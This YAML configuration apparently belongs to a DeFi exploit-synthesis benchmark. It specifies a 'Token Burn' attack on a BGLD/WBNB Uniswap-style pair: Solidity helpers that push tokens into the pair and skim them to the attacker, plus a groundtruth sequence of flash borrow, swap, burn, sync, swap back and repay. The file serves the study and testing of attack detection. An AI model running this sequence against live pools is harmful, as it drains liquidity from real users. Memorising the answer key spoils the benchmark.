project_name: "BGLD"

# Abstract name of a DeFi contract and its class name.
ctrt_name2cls:
  - ["bgld", "BGLD"]
  - ["wbnb", "WBNB"]
  - ["pair", "UniswapV2Pair"]
  - ["factory", "UniswapV2Factory"]
  - ["router", "UniswapV2Router"]

# For contract deployment
ctrt_name2deploy:
  - ["bgld", "new BGLD()"]
  - ["wbnb", ""]
  - ["pair", ""]
  - ["factory", ""]
  - ["router", ""]

extra_actions:
  - "function burn_pair_bgld(uint256 amount) internal {
    bgld.transfer(address(pair), amount * 10);
    pair.skim(attacker);
    }"

  - "function swap_pair_wbnb_bgld(uint256 amount) internal {
    address[] memory path = new address[](2);
    path[0] = address(wbnb);
    path[1] = address(bgld);
    uint256[] memory values = router.getAmountsOut(amount, path);
    wbnb.transfer(address(pair), wbnb.balanceOf(attacker));
    pair.swap(0, (values[1] * 90) / 100, attacker, '');
    }"

extra_deployments_before:
  - "bgld.mint(100e18);"

extra_deployments: []

extra_statements: []

attack_goal_str: "wbnb"

groundtruth:
  - ["borrow", "wbnb", "125e18"]
  - ["swap", "pair", "wbnb", "bgld", "wbnb.balanceOf(attacker)"]
  - ["burn", "pair", "bgld", "bgld.balanceOf(address(pair))"]
  - ["sync", "pair"]
  - ["swap", "pair", "bgld", "wbnb", "100 * 1e6"]
  - ["payback", "wbnb", "125e18 * 1003 / 1000"]

roles:
  "wbnb":
    is_asset: true
    is_erc20: true
    is_stablecoin: true
  "bgld":
    is_asset: true
    is_erc20: true
    is_stablecoin: false
    is_burnable: true
  "pair":
    is_swappair: true
    uniswap_order: ["wbnb", "bgld"]
    support_swaps:
      "wbnb": ["wbnb", "bgld"]
      "bgld": ["wbnb", "bgld"]
    is_oracle: true
    oracle: "pair"

pattern: "Token Burn"
